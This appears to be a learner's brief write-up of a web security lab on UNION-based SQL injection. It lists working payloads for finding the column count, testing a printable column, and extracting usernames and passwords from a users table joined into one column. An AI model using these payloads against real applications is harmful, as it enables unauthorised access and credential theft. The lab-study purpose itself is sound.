# Lab 10 – SQLi (UNION): Retrieving multiple values in a single column

**Goal:**  
Get multiple values (username + password) to appear in a *single* column via a UNION-based SQL injection, so I can read both at once.

## What I did
- first I checked it was injectable by chucking `'--` in the category param (lab already says its vuln, but i like to confirm).
- used `ORDER BY` to find the column count:
  - `' ORDER BY 1--` -> OK
  - `' ORDER BY 2--` -> OK
  - `' ORDER BY 3--` -> error  
so there are 2 columns
- tested that text prints with a quick union test: ' UNION SELECT NULL, 'a' -- worked
- then I concatenated username and password into one printable column (the lab expected `||` concatenation): ' UNION SELECT NULL, username || '~' || password FROM users--
i could see both values in one column

NO NOTES

